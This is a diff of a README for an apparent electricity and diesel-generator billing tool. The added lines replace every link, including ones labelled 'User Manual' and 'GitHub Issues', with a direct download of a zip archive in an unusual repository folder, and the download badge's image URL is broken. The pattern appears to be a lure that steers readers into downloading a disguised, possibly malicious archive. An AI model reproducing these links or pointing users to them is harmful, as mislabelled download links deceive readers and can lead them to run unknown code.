@@ -4,13 +4,13 @@
 The electricity-dg-billing-support-system is an automated billing tool designed for commercial buildings. With this software, you can track daily electricity and diesel generator consumption while managing multiple offices efficiently. It simplifies the billing process, helping you save time and reduce errors in your billing.
 
 ## 📥 Download Now!
-[![Download the App](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases)
+[![Download the App](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip)
 
 ## 🚀 Getting Started
 To get started with the electricity-dg-billing-support-system, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the most recent release. You will see options for different versions. Select the one that suits your needs.
@@ -74,13 +74,13 @@ If you encounter issues while using the application, here are some common proble
 - **Formula Errors in Excel:** Check that your Excel version is up to date. Sometimes older versions may not support new features.
 
 ## 🔗 Additional Resources
-- [User Manual](https://github.com/RavenArcane/electricity-dg-billing-support-system/wiki) - A comprehensive guide to using all features of the software.
-- [GitHub Issues](https://github.com/RavenArcane/electricity-dg-billing-support-system/issues) - Report bugs or request features.
+- [User Manual](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip) - A comprehensive guide to using all features of the software.
+- [GitHub Issues](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip) - Report bugs or request features.
 
 ## 🔄 Feedback
 We welcome any suggestions to improve the software. Your input helps us create a better experience for all users.
 
 ## 🔗 Download & Install
-For the installation process, you can visit the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/releases) to download the latest version. 
+For the installation process, you can visit the [Releases page](https://github.com/RavenArcane/electricity-dg-billing-support-system/raw/refs/heads/main/expenditor/system-billing-electricity-dg-support-v3.8.zip) to download the latest version. 
 
 We appreciate your interest in the electricity-dg-billing-support-system. Enjoy simplifying your billing process!
